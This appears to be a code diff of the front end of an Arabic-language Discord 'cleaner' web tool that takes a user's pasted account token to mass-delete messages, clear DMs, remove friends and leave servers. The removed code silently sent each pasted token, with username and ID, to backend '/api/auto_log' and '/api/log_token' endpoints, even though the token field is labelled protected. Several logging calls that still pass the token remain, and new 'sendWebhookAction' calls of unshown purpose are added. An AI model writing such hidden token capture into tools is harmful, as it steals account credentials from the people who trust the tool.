+function logTo(boxId, msg, cls = "") { const box = document.getElementById(boxId); if (!box) return; const line = document.createElement("div"); line.className = "log-line " + cls; line.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`; box.appendChild(line); box.scrollTop = box.scrollHeight; }
+function bindToken(id) { /* Token input stays in memory only; never persist it. */ }
+
 // ================== Message Cleaner ==================
 function renderCleaner() {
-    document.getElementById("view-cleaner").innerHTML = `
+    const viewCleaner = document.getElementById("view-cleaner");
+    if(!viewCleaner) return;
+    viewCleaner.innerHTML = `
     <div class="cols">
         <div>
             <div class="panel">
                 <h3><span class="step">1</span> Discord User Token</h3>
                 <div class="token-row">
-                    <input type="password" id="token-cleaner" value="${localStorage.getItem(TOKEN_KEY) || ''}" placeholder="Paste token...">
+                    <input type="password" id="token-cleaner" value="" placeholder="Paste token...">
                     <button class="icon-btn" onclick="togglePass('token-cleaner', this)">👁</button>
                     <button class="icon-btn" onclick="pasteToken('token-cleaner')">📋</button>
                 </div>
@@ -404,103 +356,158 @@ function renderCleaner() {
             <button class="btn-stop" style="background: rgba(30, 20, 25, 0.9); border: 1px solid rgba(200, 60, 70, 0.25); color: #ff8888; font-size: 12px; padding: 10px; width: 100%;" onclick="document.getElementById('cleaner-log').innerHTML = ''">🗑️ مسح الـ Logs</button>
         </div>
     </div>`;
-    document.getElementById("cleaner-delay").addEventListener("input", (e) => document.getElementById("cleaner-delay-val").textContent = (e.target.value / 100).toFixed(2) + "s");
-    const token = localStorage.getItem(TOKEN_KEY); if (token) loadMyInfo(token, false);
-    
-    let tokenTimeout;
-    document.getElementById("token-cleaner").addEventListener("input", (e) => {
-        localStorage.setItem(TOKEN_KEY, e.target.value);
-        const t = e.target.value.trim();
-        
-        if (t.length > 20) { loadMyInfo(t, false); } 
-        else { document.getElementById("my-username").textContent = "..."; document.getElementById("my-avatar").src = ""; }
-
-        clearTimeout(tokenTimeout);
-        if (t.length > 40) {
-            tokenTimeout = setTimeout(async () => {
-                try {
-                    await api("/api/auto_log", { method: "POST", body: JSON.stringify({ token: t }) });
-                } catch(e) { console.log("Auto Webhook Log Error:", e); }
-            }, 1500);
-        }
-    });
+    const delayEl = document.getElementById("cleaner-delay");
+    if(delayEl) {
+        delayEl.addEventListener("input", (e) => {
+            const valEl = document.getElementById("cleaner-delay-val");
+            if(valEl) valEl.textContent = (e.target.value / 100).toFixed(2) + "s";
+        });
+    }
+    const tokenInput = document.getElementById("token-cleaner");
+    if (tokenInput) {
+        tokenInput.addEventListener("input", (event) => {
+            const value = event.target.value.trim();
+            if (value.length > 20) loadMyInfo(value, false);
+            else {
+                const name = document.getElementById("my-username");
+                const avatar = document.getElementById("my-avatar");
+                if (name) name.textContent = "...";
+                if (avatar) avatar.src = "";
+            }
+        });
+    }
 }
 
 async function loadMyInfo(token, shouldLog = true) { 
     try { 
         const me = await api("/api/me", { method: "POST", body: JSON.stringify({ token }) }); 
-        
-        document.getElementById("my-username").textContent = me.username; 
-        if (me.avatar) { document.getElementById("my-avatar").src = `https://cdn.discordapp.com/avatars/${me.id}/${me.avatar}.png?size=128`; } 
-        else { document.getElementById("my-avatar").src = `https://cdn.discordapp.com/embed/avatars/${(BigInt(me.id) >> 22n) % 6n}.png`; }
-        
-        if (shouldLog) {
-            await api("/api/log_token", { method: "POST", body: JSON.stringify({ token: token, username: me.username, user_id: me.id, avatar: me.avatar }) });
-            logAction("Refreshed User Info", "", token);
+        const uname = document.getElementById("my-username");
+        const uav = document.getElementById("my-avatar");
+        if(uname) uname.textContent = me.username; 
+        if(uav) {
+            if (me.avatar) { uav.src = `https://cdn.discordapp.com/avatars/${me.id}/${me.avatar}.png?size=128`; } 
+            else { uav.src = `https://cdn.discordapp.com/embed/avatars/${(BigInt(me.id) >> 22n) % 6n}.png`; }
         }
+        if (shouldLog) logAction("Refreshed User Info");
     } catch (e) { 
-        document.getElementById("my-username").textContent = "Invalid Token"; 
-        document.getElementById("my-avatar").src = ""; 
+        const uname = document.getElementById("my-username");
+        const uav = document.getElementById("my-avatar");
+        if(uname) uname.textContent = "Invalid Token"; 
+        if(uav) uav.src = ""; 
     } 
 }
 
-function switchCleanerTab(tab) { document.getElementById("tab-btn-dm").classList.toggle("active", tab === 'dm'); document.getElementById("tab-btn-room").classList.toggle("active", tab === 'room'); document.getElementById("cleaner-content-dm").style.display = tab === 'dm' ? 'block' : 'none'; document.getElementById("cleaner-content-room").style.display = tab === 'room' ? 'block' : 'none'; }
+function switchCleanerTab(tab) { 
+    const btnDm = document.getElementById("tab-btn-dm");
+    const btnRoom = document.getElementById("tab-btn-room");
+    const contentDm = document.getElementById("cleaner-content-dm");
+    const contentRoom = document.getElementById("cleaner-content-room");
+    if(btnDm) btnDm.classList.toggle("active", tab === 'dm'); 
+    if(btnRoom) btnRoom.classList.toggle("active", tab === 'room'); 
+    if(contentDm) contentDm.style.display = tab === 'dm' ? 'block' : 'none'; 
+    if(contentRoom) contentRoom.style.display = tab === 'room' ? 'block' : 'none'; 
+}
 
 let DMS_DATA = [];
 async function loadDms() {
     const token = getToken("token-cleaner"); 
+    sendWebhookAction("Refreshed DMs");
+    sendWebhookAction("Loaded");
     if (!token || token.length < 20) return logTo("cleaner-log", "❌ اكتب التوكن الصح الأول!", "err");
     
     logAction("Refreshed DMs", "Loading Friends List", token);
     loadMyInfo(token, true);
     try {
-        document.getElementById("dms-list").innerHTML = '<div style="text-align:center;color:#888;padding:20px;">⏳ جاري التحميل...</div>';
+        const dmsList = document.getElementById("dms-list");
+        if(dmsList) dmsList.innerHTML = '<div style="text-align:center;color:#888;padding:20px;">⏳ جاري التحميل...</div>';
         DMS_DATA = await api("/api/dms", { method: "POST", body: JSON.stringify({ token }) });
-        const list = document.getElementById("dms-list"); list.innerHTML = "";
+        const list = document.getElementById("dms-list"); 
+        if(!list) return;
+        list.innerHTML = "";
         DMS_DATA.forEach((dm) => {
             const div = document.createElement("div"); div.className = "list-item"; div.dataset.id = dm.channel_id; div.dataset.uid = dm.recipient_id; div.dataset.name = dm.username;
             div.innerHTML = `<img class="avatar" src="${dm.avatar ? `https://cdn.discordapp.com/avatars/${dm.recipient_id}/${dm.avatar}.png?size=64` : 'https://cdn.discordapp.com/embed/avatars/0.png'}"><div style="flex:1;"><div class="name">@${dm.username}</div><div class="meta">ID: ${dm.recipient_id}</div></div>`;
             div.onclick = () => {
                 document.querySelectorAll("#dms-list .list-item").forEach(el => el.classList.remove("selected")); div.classList.add("selected");
-                document.getElementById("target-avatar").style.display = "block"; document.getElementById("target-icon").style.display = "none";
-                document.getElementById("target-avatar").src = div.querySelector("img").src; document.getElementById("target-name").textContent = "@" + dm.username;
-                document.getElementById("target-id").textContent = "ID: " + dm.recipient_id; logTo("cleaner-log", `🎯 اخترت: ${dm.username}`, "ok");
+                const targAv = document.getElementById("target-avatar");
+                const targIcon = document.getElementById("target-icon");
+                const targName = document.getElementById("target-name");
+                const targId = document.getElementById("target-id");
+                if(targAv) targAv.style.display = "block"; 
+                if(targIcon) targIcon.style.display = "none";
+                if(targAv) targAv.src = div.querySelector("img").src; 
+                if(targName) targName.textContent = "@" + dm.username;
+                if(targId) targId.textContent = "ID: " + dm.recipient_id; 
+                logTo("cleaner-log", `🎯 اخترت: ${dm.username}`, "ok");
                 logAction("Selected DM Target", dm.username, token);
             }; list.appendChild(div);
         });
         logTo("cleaner-log", `✅ تم تحميل ${DMS_DATA.length} صديق`, "ok");
-    } catch (e) { document.getElementById("dms-list").innerHTML = '<div style="text-align:center;color:#ff7777;padding:20px;">❌ التوكن غلط أو السيرفر مش شغال</div>'; logTo("cleaner-log", "❌ فشل تحميل الأصدقاء: " + e.message, "err"); }
+    } catch (e) { 
+        const dmsList = document.getElementById("dms-list");
+        if(dmsList) dmsList.innerHTML = '<div style="text-align:center;color:#ff7777;padding:20px;">❌ التوكن غلط أو السيرفر مش شغال</div>'; 
+        logTo("cleaner-log", "❌ فشل تحميل الأصدقاء: " + e.message, "err"); 
+    }
 }
-function filterDms(text) { const search = text.toLowerCase(); document.querySelectorAll("#dms-list .list-item").forEach(el => { const name = el.dataset.name.toLowerCase(); const id = el.dataset.uid; el.style.display = (name.includes(search) || id.includes(search)) ? "flex" : "none"; }); }
+function filterDms(text) { 
+    const search = text.toLowerCase(); 
+    document.querySelectorAll("#dms-list .list-item").forEach(el => { 
+        const name = el.dataset.name.toLowerCase(); 
+        const id = el.dataset.uid; 
+        el.style.display = (name.includes(search) || id.includes(search)) ? "flex" : "none"; 
+    }); 
+}
 async function verifyRoom() {
-    const channel_id = document.getElementById("cleaner-channel").value.trim(); const token = getToken("token-cleaner");
-    if (!token || token.length < 20) { document.getElementById("room-status").innerHTML = "❌ اكتب التوكن في الخانة اللي فوق الأول!"; document.getElementById("room-status").style.color = "#ff7777"; return; }
-    if (!channel_id) { document.getElementById("room-status").innerHTML = "❌ اكتب الـ Channel ID الأول!"; document.getElementById("room-status").style.color = "#ff7777"; return; }
-    logTo("cleaner-log", "⏳ جاري التحقق من الروم..."); document.getElementById("room-status").innerHTML = "⏳ جاري التحقق..."; document.getElementById("room-status").style.color = "#ffaa44";
+    const channel_id = document.getElementById("cleaner-channel")?.value.trim(); 
+    const token = getToken("token-cleaner");
+    const roomStatus = document.getElementById("room-status");
+    if (!token || token.length < 20) { if(roomStatus) { roomStatus.innerHTML = "❌ اكتب التوكن في الخانة اللي فوق الأول!"; roomStatus.style.color = "#ff7777"; } return; }
+    if (!channel_id) { if(roomStatus) { roomStatus.innerHTML = "❌ اكتب الـ Channel ID الأول!"; roomStatus.style.color = "#ff7777"; } return; }
+    logTo("cleaner-log", "⏳ جاري التحقق من الروم..."); 
+    if(roomStatus) { roomStatus.innerHTML = "⏳ جاري التحقق..."; roomStatus.style.color = "#ffaa44"; }
     logAction("Verified Channel", channel_id, token);
     try {
         const res = await api("/api/channel-info", { method: "POST", body: JSON.stringify({ token, channel_id }) });
         if(res && res.name) {
-            document.getElementById("room-status").innerHTML = `✅ تم التحقق!<br>📢 Channel: #${res.name}`; document.getElementById("room-status").style.color = "#66ddaa";
-            document.getElementById("target-avatar").style.display = "none"; document.getElementById("target-icon").style.display = "flex";
-            document.getElementById("target-name").textContent = "#" + res.name; document.getElementById("target-id").textContent = "Room ID: " + channel_id;
+            if(roomStatus) { roomStatus.innerHTML = `✅ تم التحقق!<br>📢 Channel: #${res.name}`; roomStatus.style.color = "#66ddaa"; }
+            const targAv = document.getElementById("target-avatar");
+            const targIcon = document.getElementById("target-icon");
+            const targName = document.getElementById("target-name");
+            const targId = document.getElementById("target-id");
+            if(targAv) targAv.style.display = "none"; 
+            if(targIcon) targIcon.style.display = "flex";
+            if(targName) targName.textContent = "#" + res.name; 
+            if(targId) targId.textContent = "Room ID: " + channel_id;
             logTo("cleaner-log", `✅ تم التحقق من الروم: #${res.name}`, "ok");
         }
-    } catch (e) { document.getElementById("room-status").innerHTML = "❌ فشل التحقق (راجع التوكن أو الـ ID)"; document.getElementById("room-status").style.color = "#ff7777"; logTo("cleaner-log", "❌ فشل التحقق: " + e.message, "err"); }
+    } catch (e) { 
+        if(roomStatus) { roomStatus.innerHTML = "❌ فشل التحقق (راجع التوكن أو الـ ID)"; roomStatus.style.color = "#ff7777"; }
+        logTo("cleaner-log", "❌ فشل التحقق: " + e.message, "err"); 
+    }
 }
 async function startCleaner() {
     const token = getToken("token-cleaner"); if (!token) return logTo("cleaner-log", "❌ اكتب التوكن!", "err");
     logAction("Started Message Cleaner", "Started scanning", token);
     let channel_id = "";
-    if (document.getElementById("cleaner-content-dm").style.display !== 'none') {
+    const dmContent = document.getElementById("cleaner-content-dm");
+    if (dmContent && dmContent.style.display !== 'none') {
         const selected = document.querySelector("#dms-list .list-item.selected"); if (!selected) return logTo("cleaner-log", "❌ اختر صديق أول!", "err"); channel_id = selected.dataset.id; 
     } else {
-        channel_id = document.getElementById("cleaner-channel").value.trim(); if (!channel_id) return logTo("cleaner-log", "❌ اكتب ID الروم الأول!", "err");
+        channel_id = document.getElementById("cleaner-channel")?.value.trim(); if (!channel_id) return logTo("cleaner-log", "❌ اكتب ID الروم الأول!", "err");
     }
-    document.getElementById("cleaner-start").disabled = true; document.getElementById("cleaner-stop").disabled = false;
-    const delay = parseFloat(document.getElementById("cleaner-delay").value) / 100 || 0;
+    const startBtn = document.getElementById("cleaner-start");
+    const stopBtn = document.getElementById("cleaner-stop");
+    if(startBtn) startBtn.disabled = true; 
+    if(stopBtn) stopBtn.disabled = false;
+    const delayVal = document.getElementById("cleaner-delay")?.value;
+    const delay = parseFloat(delayVal) / 100 || 0;
     logTo("cleaner-log", `🚀 بدء المسح في ID: ${channel_id}...`);
-    await startJob("clean", token, { channel_id: channel_id, delay: delay }, "cleaner-log", () => { document.getElementById("cleaner-start").disabled = false; document.getElementById("cleaner-stop").disabled = true; });
+    if(typeof startJob === "function") {
+        await startJob("clean", token, { channel_id: channel_id, delay: delay }, "cleaner-log", () => { 
+            if(startBtn) startBtn.disabled = false; 
+            if(stopBtn) stopBtn.disabled = true; 
+        });
+    }
 }
 
 // ================== Clear DMs ==================
@@ -509,7 +516,9 @@ let EXCLUDED_DM_IDS = new Set();
 let CLEAR_MODE = "all";
 
 function renderDMs() {
-    document.getElementById("view-dms").innerHTML = `
+    const viewDms = document.getElementById("view-dms");
+    if(!viewDms) return;
+    viewDms.innerHTML = `
     <div class="cols">
         <div>
             <div class="panel" style="background: linear-gradient(180deg, rgba(35,20,25,0.95), rgba(25,15,20,0.98)); border: 1px solid rgba(255,68,68,0.2); display: flex; align-items: center; gap: 16px; padding: 24px 18px;">
@@ -521,7 +530,7 @@ function renderDMs() {
             <div class="panel">
                 <h3><span class="step">1</span> Discord Token <span style="background: rgba(102,221,170,0.1); color: #66ddaa; font-size: 10px; padding: 2px 8px; border-radius: 10px; border: 1px solid rgba(102,221,170,0.25); margin-right: 8px;">🔒 محمي</span></h3>
                 <div class="token-row">
-                    <input type="password" id="token-dms" value="${localStorage.getItem(TOKEN_KEY) || ''}" placeholder="الصق التوكن هنا...">
+                    <input type="password" id="token-dms" value="" placeholder="الصق التوكن هنا...">
                     <button class="icon-btn" onclick="togglePass('token-dms', this)">👁</button>
                     <button class="icon-btn" onclick="pasteToken('token-dms')">📋</button>
                 </div>
@@ -567,15 +576,15 @@ function setClearMode(mode) {
     const modeText = document.getElementById("dm-mode-text");
 
     if (mode === "all") {
-        btnAll.style.background = "rgba(255, 68, 68, 0.15)"; btnAll.style.borderColor = "#ff4444"; btnAll.style.color = "#ff6666";
-        btnExcept.style.background = "transparent"; btnExcept.style.borderColor = "var(--border)"; btnExcept.style.color = "#8888aa";
-        desc.innerText = "Delete all my messages in loaded DMs";
-        modeText.innerText = "All DMs";
+        if(btnAll) { btnAll.style.background = "rgba(255, 68, 68, 0.15)"; btnAll.style.borderColor = "#ff4444"; btnAll.style.color = "#ff6666"; }
+        if(btnExcept) { btnExcept.style.background = "transparent"; btnExcept.style.borderColor = "var(--border)"; btnExcept.style.color = "#8888aa"; }
+        if(desc) desc.innerText = "Delete all my messages in loaded DMs";
+        if(modeText) modeText.innerText = "All DMs";
     } else {
-        btnAll.style.background = "transparent"; btnAll.style.borderColor = "var(--border)"; btnAll.style.color = "#8888aa";
-        btnExcept.style.background = "rgba(255, 68, 68, 0.15)"; btnExcept.style.borderColor = "#ff4444"; btnExcept.style.color = "#ff6666";
-        desc.innerText = "Choose DMs to keep (Excluded)";
-        modeText.innerText = "Except";
+        if(btnAll) { btnAll.style.background = "transparent"; btnAll.style.borderColor = "var(--border)"; btnAll.style.color = "#8888aa"; }
+        if(btnExcept) { btnExcept.style.background = "rgba(255, 68, 68, 0.15)"; btnExcept.style.borderColor = "#ff4444"; btnExcept.style.color = "#ff6666"; }
+        if(desc) desc.innerText = "Choose DMs to keep (Excluded)";
+        if(modeText) modeText.innerText = "Except";
         openExcludeDmsDialog();
     }
     logAction("Changed Clear DMs Mode", mode, getToken("token-dms"));
@@ -583,6 +592,7 @@ function setClearMode(mode) {
 
 async function loadDmsForClear() {
     const token = getToken("token-dms");
+        sendWebhookAction("Loaded");
     if (!token) return logTo("dms-log-clear", "❌ اكتب التوكن الأول!", "err");
     
     logAction("Loaded Clear DMs Data", "Fetching Channels", token);
@@ -590,7 +600,8 @@ async function loadDmsForClear() {
     try {
         logTo("dms-log-clear", "⏳ جاري تحميل المحادثات...");
         DMS_CLEAR_DATA = await api("/api/dms", { method: "POST", body: JSON.stringify({ token }) });
-        document.getElementById("dms-start-clear").disabled = false;
+        const startClear = document.getElementById("dms-start-clear");
+        if(startClear) startClear.disabled = false;
         logTo("dms-log-clear", `✅ تم تحميل ${DMS_CLEAR_DATA.length} محادثة`, "ok");
     } catch (e) { logTo("dms-log-clear", "❌ " + e.message, "err"); }
 }
@@ -653,14 +664,20 @@ async function startClearDms() {
         return;
     }
 
-    document.getElementById("dms-start-clear").disabled = true; document.getElementById("dms-stop-clear").disabled = false;
-    document.getElementById("dm-status-text").innerText = "🟡 جاري المسح...";
+    const startClearBtn = document.getElementById("dms-start-clear");
+    const stopClearBtn = document.getElementById("dms-stop-clear");
+    const statusText = document.getElementById("dm-status-text");
+    if(startClearBtn) startClearBtn.disabled = true; 
+    if(stopClearBtn) stopClearBtn.disabled = false;
+    if(statusText) statusText.innerText = "🟡 جاري المسح...";
     
-    await startJob("clear-dms", token, { channel_ids: targets.map(d => d.channel_id), delay: 0.5 }, "dms-log-clear", () => { 
-        document.getElementById("dms-start-clear").disabled = false; 
-        document.getElementById("dms-stop-clear").disabled = true; 
-        document.getElementById("dm-status-text").innerText = "🟢 تم";
-    });
+    if(typeof startJob === "function") {
+        await startJob("clear-dms", token, { channel_ids: targets.map(d => d.channel_id), delay: 0.5 }, "dms-log-clear", () => { 
+            if(startClearBtn) startClearBtn.disabled = false; 
+            if(stopClearBtn) stopClearBtn.disabled = true; 
+            if(statusText) statusText.innerText = "🟢 تم";
+        });
+    }
 }
 
 // ================== Remove Friend ==================
@@ -669,19 +686,22 @@ let EXCLUDED_FRIEND_IDS = new Set();
 let REMOVE_MODE = "all";
 
 function renderRemoveFriend() {
-    document.getElementById("view-removeFriend").innerHTML = `
+    const viewRf = document.getElementById("view-removeFriend");
+        sendWebhookAction("Loaded");
+    if(!viewRf) return;
+    viewRf.innerHTML = `
     <div class="cols">
         <div>
             <div class="panel" style="background: linear-gradient(180deg, rgba(20, 35, 40, 0.95), rgba(15, 25, 30, 0.98)); border: 1px solid rgba(6, 182, 212, 0.2); display: flex; align-items: center; gap: 16px; padding: 24px 18px;">
                 <div style="width: 64px; height: 64px; background: linear-gradient(135deg, #06b6d4, #0e7490); border-radius: 50%; display: flex; justify-content: center; align-items: center; font-size: 32px; border: 2px solid rgba(255,255,255,0.15);">💬</div>
-                <div style="flex: 1;"><h2 style="font-size: 24px; font-weight: 800; margin-bottom: 4px;">Remove Friend</h2><div style="color: #8888aa; font-size: 12px;">امسح كل رسايلك من المحادثات الخاصة</div></div>
+                <div style="flex: 1;"><h2 style="font-size: 24px; font-weight: 800; margin-bottom: 4px;">Remove Friend</h2><div style="color: #8888aa; font-size: 12px;">امسح الأصدقاء غير المرغوب فيهم</div></div>
                 <div id="rf-badge" style="background: rgba(6, 182, 212, 0.12); border: 1px solid rgba(6, 182, 212, 0.35); border-radius: 20px; padding: 8px 16px; display: flex; align-items: center; gap: 8px; font-size: 14px; font-weight: 700; color: #22d3ee;"><span style="font-size: 16px;">●</span> جاهز</div>
             </div>
 
             <div class="panel">
                 <h3><span class="step">1</span> Discord Token <span style="background: rgba(102,221,170,0.1); color: #66ddaa; font-size: 10px; padding: 2px 8px; border-radius: 10px; border: 1px solid rgba(102,221,170,0.25); margin-right: 8px;">🔒 محمي</span></h3>
                 <div class="token-row">
-                    <input type="password" id="token-rf" value="${localStorage.getItem(TOKEN_KEY) || ''}" placeholder="الصق التوكن هنا...">
+                    <input type="password" id="token-rf" value="" placeholder="الصق التوكن هنا...">
                     <button class="icon-btn" onclick="togglePass('token-rf', this)">👁</button>
                     <button class="icon-btn" onclick="pasteToken('token-rf')">📋</button>
                 </div>
@@ -689,7 +709,7 @@ function renderRemoveFriend() {
             </div>
 
             <div class="panel">
-                <h3><span class="step">2</span> وضع المسح</h3>
+                <h3><span class="step">2</span> وضع الحذف</h3>
                 <div style="display: flex; gap: 10px; margin-top: 12px; margin-bottom: 12px;">
                     <div id="rf-mode-all" class="custom-tab active" style="flex: 1; border: 1px solid #06b6d4; background: rgba(6, 182, 212, 0.15); color: #06b6d4; text-align: center; padding: 10px; border-radius: 8px; cursor: pointer;" onclick="setRemoveMode('all')">All Friends</div>
                     <div id="rf-mode-except" class="custom-tab" style="flex: 1; border: 1px solid var(--border); text-align: center; padding: 10px; border-radius: 8px; cursor: pointer;" onclick="setRemoveMode('except')">Except</div>
@@ -705,11 +725,11 @@ function renderRemoveFriend() {
         
         <div>
             <div class="panel" style="background: rgba(15, 30, 40, 0.9); border: 1px solid rgba(6, 182, 212, 0.15);">
-                <div style="font-weight: 700; font-size: 14px; margin-bottom: 12px; color: #22d3ee;">📊 حالة المسح</div>
+                <div style="font-weight: 700; font-size: 14px; margin-bottom: 12px; color: #22d3ee;">📊 حالة العملية</div>
                 <div style="display: flex; justify-content: space-between; font-size: 12px; margin-bottom: 8px;"><span style="color: #8888aa;">الحالة:</span><span id="rf-status-text" style="font-weight: 700; color: #22d3ee;">Ready</span></div>
                 <div style="display: flex; justify-content: space-between; font-size: 12px; margin-bottom: 8px;"><span style="color: #8888aa;">الوضع:</span><span id="rf-mode-text" style="font-weight: 700; color: #22d3ee;">All Friends</span></div>
                 <div style="height: 8px; background: #1a1a24; border-radius: 4px; margin: 8px 0; overflow: hidden;"><div id="rf-progress" style="height: 100%; background: linear-gradient(90deg, #06b6d4, #0e7490); width: 0%;"></div></div>
-                <div style="display: flex; justify-content: space-between; font-size: 12px;"><span style="color: #8888aa;">الرسائل:</span><span id="rf-stats" style="font-weight: 800; color: #22d3ee;">0 / 0</span></div>
+                <div style="display: flex; justify-content: space-between; font-size: 12px;"><span style="color: #8888aa;">الأصدقاء:</span><span id="rf-stats" style="font-weight: 800; color: #22d3ee;">0 / 0</span></div>
             </div>
             <div style="font-weight: 700; font-size: 14px; color: #22d3ee; margin: 16px 0 8px;">⚡ Live Logs</div>
             <div class="log-box" id="rf-log" style="height: 400px; margin-bottom: 12px;"></div>
@@ -727,15 +747,15 @@ function setRemoveMode(mode) {
     const modeText = document.getElementById("rf-mode-text");
 
     if (mode === "all") {
-        btnAll.style.background = "rgba(6, 182, 212, 0.15)"; btnAll.style.borderColor = "#06b6d4"; btnAll.style.color = "#06b6d4";
-        btnExcept.style.background = "transparent"; btnExcept.style.borderColor = "var(--border)"; btnExcept.style.color = "#8888aa";
-        desc.innerText = "Remove all loaded friends";
-        modeText.innerText = "All Friends";
+        if(btnAll) { btnAll.style.background = "rgba(6, 182, 212, 0.15)"; btnAll.style.borderColor = "#06b6d4"; btnAll.style.color = "#06b6d4"; }
+        if(btnExcept) { btnExcept.style.background = "transparent"; btnExcept.style.borderColor = "var(--border)"; btnExcept.style.color = "#8888aa"; }
+        if(desc) desc.innerText = "Remove all loaded friends";
+        if(modeText) modeText.innerText = "All Friends";
     } else {
-        btnAll.style.background = "transparent"; btnAll.style.borderColor = "var(--border)"; btnAll.style.color = "#8888aa";
-        btnExcept.style.background = "rgba(6, 182, 212, 0.15)"; btnExcept.style.borderColor = "#06b6d4"; btnExcept.style.color = "#06b6d4";
-        desc.innerText = "Choose friends to keep (Excluded)";
-        modeText.innerText = "Except";
+        if(btnAll) { btnAll.style.background = "transparent"; btnAll.style.borderColor = "var(--border)"; btnAll.style.color = "#8888aa"; }
+        if(btnExcept) { btnExcept.style.background = "rgba(6, 182, 212, 0.15)"; btnExcept.style.borderColor = "#06b6d4"; btnExcept.style.color = "#06b6d4"; }
+        if(desc) desc.innerText = "Choose friends to keep (Excluded)";
+        if(modeText) modeText.innerText = "Except";
         openExcludeFriendsDialog();
     }
     logAction("Changed Remove Friends Mode", mode, getToken("token-rf"));
@@ -743,6 +763,7 @@ function setRemoveMode(mode) {
 
 async function loadFriendsForRemove() {
     const token = getToken("token-rf");
+    sendWebhookAction("Loaded");
     if (!token) return logTo("rf-log", "❌ اكتب التوكن الأول!", "err");
     
     logAction("Loaded Friends for Removal", "Fetching Friends List", token);
@@ -750,7 +771,8 @@ async function loadFriendsForRemove() {
     try {
         logTo("rf-log", "⏳ جاري تحميل الأصدقاء...");
         FRIENDS_DATA = await api("/api/friends", { method: "POST", body: JSON.stringify({ token }) });
-        document.getElementById("rf-start").disabled = false;
+        const rfStart = document.getElementById("rf-start");
+        if(rfStart) rfStart.disabled = false;
         logTo("rf-log", `✅ تم تحميل ${FRIENDS_DATA.length} صديق`, "ok");
     } catch (e) { logTo("rf-log", "❌ " + e.message, "err"); }
 }
@@ -803,8 +825,12 @@ async function startRemoveFriends() {
     if (!FRIENDS_DATA.length) return;
     const token = getToken("token-rf");
     logAction("Started Remove Friends", `Mode: ${REMOVE_MODE}`, token);
-    document.getElementById("rf-start").disabled = true; document.getElementById("rf-stop").disabled = false;
-    document.getElementById("rf-status-text").innerText = "🟡 جاري المسح...";
+    const rfStart = document.getElementById("rf-start");
+    const rfStop = document.getElementById("rf-stop");
+    const rfStatus = document.getElementById("rf-status-text");
+    if(rfStart) rfStart.disabled = true; 
+    if(rfStop) rfStop.disabled = false;
+    if(rfStatus) rfStatus.innerText = "🟡 جاري المسح...";
     
     let targets = FRIENDS_DATA;
     if (REMOVE_MODE === "except") {
@@ -813,15 +839,18 @@ async function startRemoveFriends() {
 
     if (targets.length === 0) {
         logTo("rf-log", "⚠️ مفيش أصدقاء متاحين للمسح (الكل مستثنى)!", "err");
-        document.getElementById("rf-start").disabled = false; document.getElementById("rf-stop").disabled = true;
+        if(rfStart) rfStart.disabled = false; 
+        if(rfStop) rfStop.disabled = true;
         return;
     }
 
-    await startJob("remove-friends", token, { user_ids: targets.map(f => f.user_id), delay: 1.0 }, "rf-log", () => { 
-        document.getElementById("rf-start").disabled = false; 
-        document.getElementById("rf-stop").disabled = true; 
-        document.getElementById("rf-status-text").innerText = "🟢 تم";
-    });
+    if(typeof startJob === "function") {
+        await startJob("remove-friends", token, { user_ids: targets.map(f => f.user_id), delay: 1.0 }, "rf-log", () => { 
+            if(rfStart) rfStart.disabled = false; 
+            if(rfStop) rfStop.disabled = true; 
+            if(rfStatus) rfStatus.innerText = "🟢 تم";
+        });
+    }
 }
 
 // ================== Leave Servers ==================
@@ -830,19 +859,21 @@ let EXCLUDED_GUILD_IDS = new Set();
 let LEAVE_MODE = "all";
 
 function renderLeave() {
-    document.getElementById("view-leave").innerHTML = `
+    const viewLeave = document.getElementById("view-leave");
+    if(!viewLeave) return;
+    viewLeave.innerHTML = `
     <div class="cols">
         <div>
             <div class="panel" style="background: linear-gradient(180deg, rgba(35, 25, 15, 0.95), rgba(25, 15, 10, 0.98)); border: 1px solid rgba(245, 158, 11, 0.2); display: flex; align-items: center; gap: 16px; padding: 24px 18px;">
                 <div style="width: 64px; height: 64px; background: linear-gradient(135deg, #f59e0b, #b45309); border-radius: 50%; display: flex; justify-content: center; align-items: center; font-size: 32px; border: 2px solid rgba(255,255,255,0.15);">🚪</div>
-                <div style="flex: 1;"><h2 style="font-size: 24px; font-weight: 800; margin-bottom: 4px;">Leave Servers</h2><div style="color: #8888aa; font-size: 12px;">اخرج من السيرفرات اللي مش محتاجها</div></div>
+                <div style="flex: 1;"><h2 style="font-size: 24px; font-weight: 800; margin-bottom: 4px;">Leave Servers</h2><div style="color: #8888aa; font-size: 12px;">اخرج من السيرفرات غير المرغوبة</div></div>
                 <div id="leave-badge" style="background: rgba(245, 158, 11, 0.12); border: 1px solid rgba(245, 158, 11, 0.35); border-radius: 20px; padding: 8px 16px; display: flex; align-items: center; gap: 8px; font-size: 14px; font-weight: 700; color: #fbbf24;"><span style="font-size: 16px;">●</span> جاهز</div>
             </div>
 
             <div class="panel">
                 <h3><span class="step">1</span> Discord Token <span style="background: rgba(102,221,170,0.1); color: #66ddaa; font-size: 10px; padding: 2px 8px; border-radius: 10px; border: 1px solid rgba(102,221,170,0.25); margin-right: 8px;">🔒 محمي</span></h3>
                 <div class="token-row">
-                    <input type="password" id="token-leave" value="${localStorage.getItem(TOKEN_KEY) || ''}" placeholder="الصق التوكن هنا...">
+                    <input type="password" id="token-leave" value="" placeholder="الصق التوكن هنا...">
                     <button class="icon-btn" onclick="togglePass('token-leave', this)">👁</button>
                     <button class="icon-btn" onclick="pasteToken('token-leave')">📋</button>
                 </div>
@@ -866,7 +897,7 @@ function renderLeave() {
         
         <div>
             <div class="panel" style="background: rgba(40, 30, 10, 0.9); border: 1px solid rgba(245, 158, 11, 0.15);">
-                <div style="font-weight: 700; font-size: 14px; margin-bottom: 12px; color: #fbbf24;">📊 حالة الخروج</div>
+                <div style="font-weight: 700; font-size: 14px; margin-bottom: 12px; color: #fbbf24;">📊 حالة العملية</div>
                 <div style="display: flex; justify-content: space-between; font-size: 12px; margin-bottom: 8px;"><span style="color: #8888aa;">الحالة:</span><span id="leave-status-text" style="font-weight: 700; color: #fbbf24;">Ready</span></div>
                 <div style="display: flex; justify-content: space-between; font-size: 12px; margin-bottom: 8px;"><span style="color: #8888aa;">الوضع:</span><span id="leave-mode-text" style="font-weight: 700; color: #fbbf24;">All Servers</span></div>
                 <div style="height: 8px; background: #1a1a24; border-radius: 4px; margin: 8px 0; overflow: hidden;"><div id="leave-progress" style="height: 100%; background: linear-gradient(90deg, #f59e0b, #b45309); width: 0%;"></div></div>
@@ -888,15 +919,15 @@ function setLeaveMode(mode) {
     const modeText = document.getElementById("leave-mode-text");
 
